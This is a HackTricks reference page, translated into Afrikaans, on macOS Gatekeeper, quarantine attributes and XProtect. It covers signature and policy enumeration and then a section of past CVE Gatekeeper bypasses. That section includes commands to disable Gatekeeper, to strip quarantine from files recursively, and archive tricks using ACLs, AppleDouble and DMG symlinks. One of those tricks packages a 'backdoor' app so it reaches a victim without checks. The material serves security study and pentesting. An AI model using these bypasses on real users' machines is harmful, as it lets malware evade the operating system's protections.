# macOS Gatekeeper / Quarantine / XProtect

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy by 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud)

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Gatekeeper

**Gatekeeper** is 'n sekuriteitskenmerk wat ontwikkel is vir Mac-bedryfstelsels, ontwerp om te verseker dat gebruikers slegs **vertroude sagteware** op hul stelsels **hardloop**. Dit funksioneer deur die sagteware te **valideer** wat 'n gebruiker aflaai en probeer oopmaak van **bronne buite die App Store**, soos 'n program, 'n invoegtoepassing, of 'n installeerderpakket.

Die sleutelmeganisme van Gatekeeper lê in sy **verifikasieproses**. Dit kontroleer of die afgelaaide sagteware **deur 'n erkenbare ontwikkelaar onderteken** is, wat die egtheid van die sagteware verseker. Verder bepaal dit of die sagteware **deur Apple genoteer** is, wat bevestig dat dit vry is van bekende skadelike inhoud en nie ná notering getakel is nie.

Daarbenewens versterk Gatekeeper gebruikersbeheer en -sekuriteit deur gebruikers te **vra om die oopmaak van afgelaaide sagteware goed te keur** vir die eerste keer. Hierdie beskerming help voorkom dat gebruikers moontlik skadelike uitvoerbare kode per ongeluk hardloop wat hulle dalk vir 'n onskadelike databestand gehou het.

### Aansoekhandtekeninge

Aansoekhandtekeninge, ook bekend as kodehandtekeninge, is 'n kritieke komponent van Apple se sekuriteitsinfrastruktuur. Dit word gebruik om die identiteit van die sagteware-skrywer (die ontwikkelaar) te **verifieer** en om te verseker dat die kode nie sedert die laaste ondertekening getakel is nie.

So werk dit:

1. **Onderteken die Aansoek:** Wanneer 'n ontwikkelaar gereed is om hul aansoek te versprei, **onderteken hulle die aansoek met 'n privaatsleutel**. Hierdie privaatsleutel is geassosieer met 'n **sertifikaat wat Apple aan die ontwikkelaar uitreik** wanneer hulle inskryf vir die Apple-ontwikkelaarsprogram. Die ondertekeningsproses behels die skep van 'n kriptografiese hasj van alle dele van die aansoek en die versleuteling van hierdie hasj met die ontwikkelaar se privaatsleutel.
2. **Versprei die Aansoek:** Die ondertekende aansoek word dan saam met die ontwikkelaar se sertifikaat, wat die ooreenstemmende openbare sleutel bevat, aan gebruikers versprei.
3. **Verifieer die Aansoek:** Wanneer 'n gebruiker die aansoek aflaai en probeer hardloop, gebruik hul Mac-bedryfstelsel die openbare sleutel van die ontwikkelaar se sertifikaat om die hasj te ontsluit. Dit bereken dan die hasj opnuut op grond van die huidige toestand van die aansoek en vergelyk dit met die ontslote hasj. As hulle ooreenstem, beteken dit dat **die aansoek nie gewysig is** sedert die ontwikkelaar dit onderteken het nie, en die stelsel laat die aansoek toe om te hardloop.

Aansoekhandtekeninge is 'n noodsaaklike deel van Apple se Gatekeeper-tegnologie. Wanneer 'n gebruiker probeer om 'n aansoek wat van die internet afgelaai is, **oop te maak**, verifieer Gatekeeper die aansoekhandtekening. As dit onderteken is met 'n sertifikaat wat deur Apple aan 'n bekende ontwikkelaar uitgereik is en die kode nie getakel is nie, laat Gatekeeper die aansoek toe om te hardloop. Andersins blokkeer dit die aansoek en waarsku die gebruiker.

Vanaf macOS Catalina **kontroleer Gatekeeper ook of die aansoek deur Apple genoteer is**, wat 'n ekstra laag van sekuriteit toevoeg. Die noteringsproses kontroleer die aansoek vir bekende sekuriteitsprobleme en skadelike kode, en as hierdie kontroles slaag, voeg Apple 'n kaartjie by die aansoek wat Gatekeeper kan verifieer.

#### Kontroleer Handtekeninge

Wanneer jy 'n **malwaremonster** ondersoek, moet jy altyd die handtekening van die binêre lêer **kontroleer**, aangesien die **ontwikkelaar** wat dit onderteken het, moontlik reeds met **malware verband hou**.
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notarisering

Apple se notariseringproses dien as 'n addisionele beskermingsmaatreël om gebruikers te beskerm teen potensieel skadelike sagteware. Dit behels die **ontwikkelaar wat hul aansoek vir ondersoek indien** deur **Apple se Notary-diens**, wat nie verwar moet word met App Review nie. Hierdie diens is 'n **geoutomatiseerde stelsel** wat die ingediende sagteware ondersoek vir die teenwoordigheid van **skadelike inhoud** en enige potensiële probleme met kode-ondertekening.

Indien die sagteware hierdie inspeksie **slaag** sonder om enige bekommernisse te veroorsaak, genereer die Notary-diens 'n notariseringstiket. Die ontwikkelaar moet hierdie tikkie dan aan hul sagteware **heg**, 'n proses wat bekend staan as 'stapling.' Verder word die notariseringstiket ook aanlyn gepubliseer waar Gatekeeper, Apple se sekuriteitstegnologie, dit kan bereik.

Met die gebruiker se eerste installasie of uitvoering van die sagteware, **informeer die bestaan van die notariseringstiket** - of dit nou aan die uitvoerbare lêer geheg is of aanlyn gevind word - **Gatekeeper dat die sagteware deur Apple genotariseer is**. Gevolglik vertoon Gatekeeper 'n beskrywende boodskap in die aanvanklike aanvangsdialog, wat aandui dat die sagteware deur Apple vir skadelike inhoud nagegaan is. Hierdie proses verhoog dus die gebruiker se vertroue in die veiligheid van die sagteware wat hulle op hul stelsels installeer of uitvoer.

### Enumerating GateKeeper

GateKeeper is sowel **veral sekuriteitskomponente** wat voorkom dat onbetroubare programme uitgevoer word asook **een van die komponente**.

Dit is moontlik om die **status** van GateKeeper te sien met:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
Let wel dat GateKeeper-handtekeningkontroles slegs op **lêers met die Quarantine-eienskap** uitgevoer word, nie op elke lêer nie.
{% endhint %}

GateKeeper sal nagaan of 'n binêre lêer uitgevoer kan word volgens die **voorkeure & die handtekening**:

<figure><img src="../../../.gitbook/assets/image (1150).png" alt=""><figcaption></figcaption></figure>

Die databasis wat hierdie konfigurasie behou, is geleë in **`/var/db/SystemPolicy`**. Jy kan hierdie databasis as 'n root gebruiker nagaan met:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
Merk op hoe die eerste reël geëindig het in "**App Store**" en die tweede een in "**Developer ID**" en dat dit in die vorige afbeelding **geaktiveer was om programme van die App Store en geïdentifiseerde ontwikkelaars uit te voer**. As jy daardie instelling na App Store **verander**, sal die "**Notarized Developer ID" reëls verdwyn**.

Daar is ook duisende reëls van **tipe GKE**:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Dit is hashs wat afkomstig is van **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** en **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**

Of jy kan die vorige inligting lys met:
```bash
sudo spctl --list
```
Die opsies **`--master-disable`** en **`--global-disable`** van **`spctl`** sal hierdie handtekeningkontroles heeltemal **deaktiveer**:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Wanneer heeltemal geaktiveer, sal 'n nuwe opsie verskyn:

<figure><img src="../../../.gitbook/assets/image (1151).png" alt=""><figcaption></figcaption></figure>

Dit is moontlik om **te kontroleer of 'n Toepassing deur GateKeeper toegelaat sal word** met:
```bash
spctl --assess -v /Applications/App.app
```
Dit is moontlik om nuwe reëls by GateKeeper te voeg om die uitvoering van sekere programme toe te staan met:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### Karantynlêers

Met die aflaai van 'n aansoek of lêer, heg spesifieke macOS-aansoeke soos webblaaier of e-poskliënte 'n uitgebreide lêereienskap, algemeen bekend as die "**karantynvlag**," aan die afgelaaide lêer. Hierdie eienskap tree op as 'n sekuriteitsmaatreël om die lêer te merk as afkomstig van 'n onbetroubare bron (die internet) en moontlik risiko's te dra. Nie alle aansoeke heg egter hierdie eienskap nie, byvoorbeeld gewone BitTorrent-klient sagteware verbygaan gewoonlik hierdie proses.

**Die teenwoordigheid van 'n karantynvlag dui macOS se Gatekeeper-sekuriteitsfunksie aan wanneer 'n gebruiker probeer om die lêer uit te voer**.

In die geval waar die **karantynvlag nie teenwoordig is** (soos met lêers wat via sommige BitTorrent-kliënte afgelaai is), mag Gatekeeper se **kontroles nie uitgevoer word nie**. Gebruikers moet dus versigtig wees wanneer hulle lêers van minder veilige of onbekende bronne oopmaak.

{% hint style="info" %}
**Die geldigheid** van kodesignatures nagaan is 'n **hulpbron-intensiewe** proses wat die genereer van kriptografiese **hassies** van die kode en al sy gebundelde bronne insluit. Verder behels die nagaan van sertifikaatgeldigheid 'n **aanlynkontrole** na Apple se bedieners om te sien of dit herroep is nadat dit uitgereik is. Om hierdie redes is 'n volledige kodesignatuur- en notariseringskontrole **onprakties om elke keer uit te voer wanneer 'n aansoek geopen word**.

Daarom word hierdie kontroles **slegs uitgevoer wanneer aansoeke met die gekwarantynvlag uitgevoer word**.
{% endhint %}

{% hint style="warning" %}
Hierdie eienskap moet **deur die aansoek wat die lêer skep/aflaai** ingestel word.

Nietemin sal lêers wat gesandbox is hierdie eienskap aan elke lêer wat hulle skep, instel. En nie-gesandboxte programme kan dit self instel, of die [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) sleutel in die **Info.plist** spesifiseer wat die stelsel die `com.apple.quarantine` uitgebreide eienskap op die geskepte lêers sal instel,
{% endhint %}

Verder word alle lêers wat deur 'n proses geskep word wat **`qtn_proc_apply_to_self`** aanroep, gekwarantyn. Of die API **`qtn_file_apply_to_path`** voeg die karantyneienskap by 'n gespesifiseerde lêerpad.

Dit is moontlik om **die status te kontroleer en in/uit te skakel** (root benodig) met:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Jy kan ook **vind of 'n lêer die karantyn uitgebreide attribuut het** met:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
Kontroleer die **waarde** van die **uitgebreide** **kenmerke** en vind uit watter app die karantynkenmerk geskryf het met:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
Eintlik kan 'n proses "kwarentynvlaggies aan die lêers wat dit skep, stel" (ek het probeer om die USER_APPROVED-vlag in 'n geskepte lêer toe te pas, maar dit sal dit nie toepas nie):

<details>

<summary>Bronkode pas kwarentynvlaggies toe</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

En **verwyder** daardie eienskap met:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
En vind al die geïsoleerde lêers met:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

Kwarantyninligting word ook gestoor in 'n sentrale databasis wat bestuur word deur LaunchServices in **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**.

#### **Quarantine.kext**

Die kernuitbreiding is slegs beskikbaar deur die **kerngeheue op die stelsel**; jy _kan_ egter die **Kernel Debug Kit aflaai vanaf https://developer.apple.com/**, wat 'n gesimboleerde weergawe van die uitbreiding sal bevat.

### XProtect

XProtect is 'n ingeboude **teen-malware**-funksie in macOS. XProtect **kontroleer enige toepassing wanneer dit vir die eerste keer geopen of gewysig word teen sy databasis** van bekende malware en onveilige lêertipes. Wanneer jy 'n lêer aflaai deur sekere programme, soos Safari, Mail, of Messages, skandeer XProtect die lêer outomaties. As dit enige bekende malware in sy databasis pas, sal XProtect die lêer **verhoed om uit te voer** en jou waarsku oor die bedreiging.

Die XProtect-databasis word **gereeld opgedateer** deur Apple met nuwe malware-definisies, en hierdie opdaterings word outomaties afgelaai en geïnstalleer op jou Mac. Dit verseker dat XProtect altyd op datum is met die nuutste bekende bedreigings.

Dit is egter die moeite werd om te let dat **XProtect nie 'n volledige antivirusoplossing is** nie. Dit kontroleer slegs vir 'n spesifieke lys bekende bedreigings en voer nie op-toegang-skandering uit soos die meeste antivirusagteware nie.

Jy kan inligting kry oor die nuutste XProtect-opdatering deur die volgende te hardloop:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect is geleë op 'n SIP-beskermde plek by **/Library/Apple/System/Library/CoreServices/XProtect.bundle** en binne die bundel kan jy inligting vind wat XProtect gebruik:

- **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Laat kodes met daardie cdhashes toe om erfenisbevoegdhede te gebruik.
- **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: Lys van plugins en uitbreidings wat verbied word om te laai via BundleID en TeamID of wat 'n minimum weergawe aandui.
- **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Yara-reëls om malware op te spoor.
- **`XProtect.bundle/Contents/Resources/gk.db`**: SQLite3-databasis met hashe van geblokkeerde aansoeke en TeamIDs.

Let daarop dat daar 'n ander Toep in **`/Library/Apple/System/Library/CoreServices/XProtect.app`** is wat verband hou met XProtect wat nie betrokke is by die Gatekeeper-proses nie.

### Nie Gatekeeper

{% hint style="danger" %}
Let daarop dat Gatekeeper **nie elke keer uitgevoer word** wanneer jy 'n toepassing uitvoer nie, net _**AppleMobileFileIntegrity**_ (AMFI) sal slegs **uitvoerbare kodes se handtekeninge verifieer** wanneer jy 'n toep uitvoer wat reeds deur Gatekeeper uitgevoer en geverifieer is.
{% endhint %}

Daarom was dit voorheen moontlik om 'n toepassing uit te voer om dit met Gatekeeper te kash, dan **nie-uitvoerbare lêers van die toepassing te wysig** (soos Electron asar of NIB-lêers) en as geen ander beskerming in plek was nie, is die toepassing met die **skadelike** byvoegings **uitgevoer**.

Tans is dit egter nie moontlik nie omdat macOS **verhoed dat lêers** binne toepassingsbundels gewysig word nie. Dus, as jy die [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md) aanval probeer, sal jy vind dat dit nie meer moontlik is om dit te misbruik nie omdat nadat jy die toep uitvoer om dit met Gatekeeper te kash, sal jy nie in staat wees om die bundel te wysig nie. En as jy byvoorbeeld die naam van die Contents-gids na NotCon verander (soos aangedui in die uitbuiting), en dan die hoof binêre van die toep uitvoer om dit met Gatekeeper te kash, sal dit 'n fout veroorsaak en nie uitvoer nie.

## Gatekeeper Oorbruggings

Enige manier om Gatekeeper te oorbrug (om die gebruiker te laat iets aflaai en dit uit te voer wanneer Gatekeeper dit moet verbied) word as 'n kwesbaarheid in macOS beskou. Hierdie is 'n paar CVE's wat aan tegnieke toegeken is wat in die verlede toegelaat het om Gatekeeper te oorbrug:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

Daar is waargeneem dat as die **Archive Utility** vir ekstraksie gebruik word, lêers met **paaie wat 886 karakters oorskry** nie die com.apple.quarantine verlengde kenmerk ontvang nie. Hierdie situasie laat hierdie lêers onbedoeld toe om die sekuriteitskontroles van Gatekeeper te **omseil**.

Kyk na die [**oorspronklike verslag**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) vir meer inligting.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Wanneer 'n toepassing geskep word met **Automator**, is die inligting oor wat dit nodig het om uit te voer binne `application.app/Contents/document.wflow` en nie in die uitvoerbare nie. Die uitvoerbare is net 'n generiese Automator-binêre genaamd **Automator Application Stub**.

Daarom kon jy maak dat `application.app/Contents/MacOS/Automator\ Application\ Stub` **na 'n simboliese skakel na 'n ander Automator Application Stub binne die stelsel wys** en dit sal uitvoer wat binne `document.wflow` is (jou skripsie) **sonder om Gatekeeper te aktiveer** omdat die werklike uitvoerbare nie die karantyn xattr het nie.

Voorbeeld van verwagte ligging: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Kyk na die [**oorspronklike verslag**](https://ronmasas.com/posts/bypass-macos-gatekeeper) vir meer inligting.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

In hierdie oorbrugging is 'n zip-lêer geskep met 'n toep wat begin om te komprimeer vanaf `application.app/Contents` in plaas van `application.app`. Daarom is die **karantynkenmerk** toegepas op al die **lêers vanaf `application.app/Contents`** maar **nie op `application.app`**, wat was waar Gatekeeper na gekyk het, dus is Gatekeeper oorgeslaan omdat toe `application.app` geaktiveer is dit **nie die karantynkenmerk gehad het nie.**
```bash
zip -r test.app/Contents test.zip
```
Kyk na die [**oorspronklike verslag**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) vir meer inligting.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Selfs al is die komponente verskillend, is die uitbuiting van hierdie kwesbaarheid baie soortgelyk aan die vorige een. In hierdie geval sal ons 'n Apple-argief genereer vanaf **`application.app/Contents`** sodat **`application.app` nie die karantyn-attribuut sal kry** wanneer dit gedekomprimeer word deur **Archive Utility**.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Kyk na die [**oorspronklike verslag**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) vir meer inligting.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

Die ACL **`writeextattr`** kan gebruik word om te voorkom dat enigiemand 'n attribuut in 'n lêer skryf:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Verder kopieer die **AppleDouble** lêerformaat 'n lêer saam met sy ACEs.

In die [**bronkode**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) is dit moontlik om te sien dat die ACL-teksverteenwoordiging wat binne die xattr genaamd **`com.apple.acl.text`** gestoor word, as ACL in die gedekomprimeerde lêer ingestel gaan word. Dus, as jy 'n aansoek in 'n zip-lêer met die **AppleDouble** lêerformaat saam met 'n ACL wat voorkom dat ander xattrs daarin geskryf word, saamgedruk het... die karantyn xattr was nie in die aansoek ingestel nie:
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

Kyk na die [**oorspronklike verslag**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) vir meer inligting.

Let daarop dat dit ook uitgebuit kan word met AppleArchives:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

Dit is ontdek dat **Google Chrome nie die karantyn attribuut instel** vir afgelaaide lêers as gevolg van sekere macOS interne probleme.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble lêerformate stoor die eienskappe van 'n lêer in 'n aparte lêer wat begin met `._`, dit help om lêereienskappe **oor macOS-toestelle te kopieer**. Daar is egter opgemerk dat nadat 'n AppleDouble lêer gedekomprimeer is, die lêer wat begin met `._` **nie die karantyn attribuut gekry het nie**.

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

Om 'n lêer te kan skep sonder die karantynkenmerk wat ingestel is, was dit **moontlik om Gatekeeper te omseil.** Die truuk was om 'n **DMG-lêer-toepassing te skep** deur die AppleDouble-naamkonvensie te gebruik (begin dit met `._`) en 'n **sigbare lêer as 'n simboolskakel na hierdie versteekte** lêer sonder die karantynkenmerk te skep.\
Wanneer die **dmg-lêer uitgevoer word**, sal dit **Gatekeeper omseil** omdat dit nie 'n karantynkenmerk het nie.
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### uchg (van hierdie [praatjie](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf))

* Skep 'n gids wat 'n program bevat.
* Voeg uchg by die program.
* Pak die program in na 'n tar.gz-lêer.
* Stuur die tar.gz-lêer na 'n slagoffer.
* Die slagoffer maak die tar.gz-lêer oop en hardloop die program.
* Gatekeeper kontroleer nie die program nie.

### Voorkom Quarantine xattr

In 'n ".app" bundel, as die quarantine xattr nie daaraan toegevoeg word nie, wanneer dit uitgevoer word **sal Gatekeeper nie geaktiveer word nie**.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
